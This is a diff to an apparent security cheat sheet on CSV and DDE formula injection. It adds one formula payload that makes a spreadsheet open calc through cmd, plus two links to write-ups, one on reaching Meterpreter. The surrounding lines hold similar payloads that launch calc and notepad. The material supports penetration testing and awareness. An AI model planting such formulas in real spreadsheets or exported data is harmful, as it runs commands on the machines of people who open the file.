@@ -10,6 +10,7 @@ Basic exploit with Dynamic Data Exchange
 # pop a calc
 DDE ("cmd";"/C calc";"!A0")A0
 @SUM(1+1)*cmd|' /C calc'!A0
+=2+5+cmd|' /C calc'!A0
 
 # pop a notepad
 =cmd|' /C notepad'!'A1'
@@ -43,3 +44,5 @@ Any formula can be started with
 * [Comma Separated Vulnerabilities - James Kettle](https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/)
 * [CSV INJECTION: BASIC TO EXPLOIT!!!! - 30/11/2017 - Akansha Kesharwani](https://payatu.com/csv-injection-basic-to-exploit/)
 * [From CSV to Meterpreter - 5th November 2015 - Adam Chester](https://blog.xpnsec.com/from-csv-to-meterpreter/)
+* [CSV Injection -> Meterpreter on Pornhub - @ZephrFish Andy](https://news.webamooz.com/wp-content/uploads/bot/offsecmag/147.pdf)
+* [The Absurdly Underestimated Dangers of CSV Injection - 7 October, 2017 - George Mauer](http://georgemauer.net/2017/10/07/csv-injection.html)
